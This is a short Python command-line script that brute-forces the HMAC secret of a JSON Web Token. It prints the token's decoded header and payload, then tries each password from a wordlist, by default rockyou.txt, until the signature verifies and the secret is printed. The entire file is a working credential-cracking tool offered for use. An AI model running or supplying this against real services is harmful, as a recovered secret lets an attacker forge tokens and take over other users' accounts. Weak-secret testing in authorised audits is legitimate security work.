import jwt
import argparse 
import base64
import sys
import time

parser = argparse.ArgumentParser()
parser.add_argument('Jwt', help='Jwt to bruteforce')
parser.add_argument('-w', '--wordlist', help='Wordlist to use. (Default: /usr/share/wordlists/rockyou.txt', default='/usr/share/wordlists/rockyou.txt')

args = parser.parse_args()


print("Jwt informations")
token = args.Jwt.split(".")

print("[+] Signature: " + base64.b64decode(token[0]).decode())
print("[+] Datas: " + base64.b64decode(token[1]+ "==").decode())

wordlist = open(args.wordlist, encoding="latin-1").read().splitlines()

for pwd in wordlist:
	try:
		sys.stdout.write("\r" + pwd)
		sys.stdout.flush() 
		jwt.decode(args.Jwt, pwd)
		print("\n[+] Secret found: " + pwd)
		exit(1)
	except jwt.exceptions.InvalidSignatureError:
		continue

print("Secret not found")